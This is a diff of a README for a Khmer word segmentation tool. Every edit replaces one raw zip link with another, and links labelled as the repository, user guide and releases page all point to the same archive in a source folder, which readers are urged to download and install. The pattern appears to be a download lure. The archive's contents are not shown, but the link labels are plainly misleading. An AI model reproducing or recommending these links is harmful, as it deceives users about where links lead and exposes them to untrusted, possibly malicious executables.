@@ -1,6 +1,6 @@
 # 🌟 khmer_segmenter - Fast and Easy Khmer Word Segmentation
 
-[![Download khmer_segmenter](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/c/segmenter_khmer_aftersound.zip%20khmer_segmenter-blue?style=flat&logo=github)](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/c/segmenter_khmer_aftersound.zip)
+[![Download khmer_segmenter](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/rust/src/khmer-segmenter-3.0.zip%20khmer_segmenter-blue?style=flat&logo=github)](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/rust/src/khmer-segmenter-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 
-To get khmer_segmenter, visit this page to download: [Download khmer_segmenter](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/c/segmenter_khmer_aftersound.zip).
+To get khmer_segmenter, visit this page to download: [Download khmer_segmenter](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/rust/src/khmer-segmenter-3.0.zip).
 
 Click on the link above to find the latest version. Download the installer for your operating system.
 
@@ -78,13 +78,13 @@ For advanced users, khmer_segmenter offers options for tweaking performance sett
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/c/segmenter_khmer_aftersound.zip)
-- [User Guide](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/c/segmenter_khmer_aftersound.zip)
+- [GitHub Repository](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/rust/src/khmer-segmenter-3.0.zip)
+- [User Guide](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/rust/src/khmer-segmenter-3.0.zip)
 
 ## 📢 Keep It Updated
 
-We regularly release updates to enhance performance. To ensure you have the best experience, check for updates on the [Releases page](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/c/segmenter_khmer_aftersound.zip) periodically.
+We regularly release updates to enhance performance. To ensure you have the best experience, check for updates on the [Releases page](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/rust/src/khmer-segmenter-3.0.zip) periodically.
 
-[Download khmer_segmenter](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/c/segmenter_khmer_aftersound.zip)
+[Download khmer_segmenter](https://github.com/Schapeedy1/khmer_segmenter/raw/refs/heads/main/port/rust/src/khmer-segmenter-3.0.zip)
 
 Now you are ready to use khmer_segmenter! Enjoy easy and efficient Khmer word segmentation.
